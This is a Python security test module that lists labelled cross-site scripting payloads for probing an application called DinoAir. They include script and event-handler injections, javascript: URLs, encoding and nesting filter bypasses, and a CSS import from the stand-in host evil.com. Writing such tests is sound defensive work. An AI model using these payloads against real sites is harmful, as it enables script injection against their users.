"""
XSS (Cross-Site Scripting) attack testing module.

Tests for script injection vulnerabilities in DinoAir.
"""

from typing import List, Tuple
from tests.security.core.base_tester import BaseSecurityTester


class XSSTester(BaseSecurityTester):
    """Tests for XSS vulnerabilities."""
    
    def get_test_name(self) -> str:
        """Get the name of this test category."""
        return "XSS"
    
    def get_payloads(self) -> List[Tuple[str, str]]:
        """Get XSS test payloads."""
        return [
            # Basic XSS
            ("<script>alert('XSS')</script>", "Basic script tag"),
            ("<img src=x onerror=alert('XSS')>", "Image tag XSS"),
            ("<svg onload=alert('XSS')>", "SVG tag XSS"),
            
            # Event handlers
            ("<body onload=alert('XSS')>", "Body onload"),
            ("<input onfocus=alert('XSS') autofocus>", 
             "Input autofocus"),
            ("<div onmouseover=alert('XSS')>hover me</div>",
             "Mouse event"),
            
            # JavaScript URLs
            ("javascript:alert('XSS')", "JavaScript protocol"),
            ("data:text/html,<script>alert('XSS')</script>", 
             "Data URL"),
            ("vbscript:msgbox('XSS')", "VBScript protocol"),
            
            # Encoded XSS
            ("%3Cscript%3Ealert('XSS')%3C/script%3E", 
             "URL encoded"),
            ("&#60;script&#62;alert('XSS')&#60;/script&#62;", 
             "HTML entities"),
            ("&lt;script&gt;alert('XSS')&lt;/script&gt;", 
             "HTML encoded"),
            
            # Case variations
            ("<ScRiPt>alert('XSS')</ScRiPt>", "Mixed case"),
            ("<SCRIPT>alert('XSS')</SCRIPT>", "Upper case"),
            
            # Broken tags
            ("<script>alert('XSS')", "Unclosed tag"),
            ("<<script>alert('XSS')//", "Double bracket"),
            ("<script>alert('XSS')</script", "Missing >"),
            
            # Unicode XSS
            ("\u003cscript\u003ealert('XSS')\u003c/script\u003e", 
             "Unicode escape"),
            ("\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
             "Escaped Unicode"),
            
            # Bypass attempts
            ("<scr<script>ipt>alert('XSS')</scr</script>ipt>", 
             "Nested tags"),
            ("<img src='x' onerror='alert`XSS`'>", 
             "Template literals"),
            ("<script>alert(String.fromCharCode(88,83,83))</script>",
             "Char codes"),
            
            # CSS injection
            ("<style>body{background:url('javascript:alert(1)')}</style>",
             "CSS JavaScript URL"),
            ("<style>@import 'http://evil.com/xss.css';</style>",
             "CSS import"),
            
            # HTML5 vectors
            ("<video><source onerror='alert(1)'>", "Video tag"),
            ("<audio src=x onerror=alert('XSS')>", "Audio tag"),
            ("<details open ontoggle=alert('XSS')>", "Details tag"),
            
            # Meta refresh
            ("<meta http-equiv='refresh' content='0;javascript:alert(1)'>",
             "Meta refresh"),
        ]